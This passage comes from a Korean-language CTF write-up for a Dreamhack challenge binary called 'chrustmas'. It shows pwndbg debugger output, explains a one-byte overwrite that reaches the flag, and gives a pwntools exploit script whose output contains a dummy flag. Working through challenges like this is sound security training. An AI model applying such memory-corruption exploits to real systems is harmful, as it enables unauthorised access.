02:0010│     0x7fffffffe180 —▸ 0x55555555dfa0 (core::array::<impl core::fmt::Debug for [T; N]>::fmt) ◂— sub rsp, 0x18
03:0018│     0x7fffffffe188 ◂— 0x11
04:0020│     0x7fffffffe190 —▸ 0x5555555b9bb0 ◂— 'aaaaaaaaaaaaaaaab\n'
05:0028│     0x7fffffffe198 ◂— 0x11
... ↓        2 skipped
───────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► 0   0x55555555ee92 prob::main+770
   1   0x55555555d883 core::ops::function::FnOnce::call_once+3
   2   0x55555555cea6 std::sys_common::backtrace::__rust_begin_short_backtrace+6
   3   0x55555555d409 std::rt::lang_start::{{closure}}+9
   4   0x5555555763ab std::rt::lang_start_internal+1051
   5   0x5555555763ab std::rt::lang_start_internal+1051
   6   0x5555555763ab std::rt::lang_start_internal+1051
   7   0x5555555763ab std::rt::lang_start_internal+1051
───────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

rax 레지스터의 값을 보면 다행이도 하위 1바이트를 제외하고 rcx와 동일한 값을 가지고 있다. 따라서 16개의 a와 0x10을 바이트로 전송하면 플레그 획득에 성공한다. 공격 코드와 결과는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')

p = process("./prob")

payload = b"\x61"*16
#payload += b"\x10\xea\x55\x55"
payload += b"\x10"


p.sendlineafter(b"Password >> ", payload)


print(p.recvall())
```

```c++
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy# python3 exp.py 
[+] Starting local process './prob': pid 173
[+] Receiving all data: Done (145B)
[*] Process './prob' stopped with exit code 0 (pid 173)
b"[97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97]\nCongratulations! I hope you've got a couple Christmas!!!\nflag: DH{sample_flag}\n\n"
root@7cb73a3db36b:/home/dreamhack/chrustmas/deploy#
```

플래그는 더미이며 실 문제 서버에 적용하면 플레그를 획득할 수 있다.




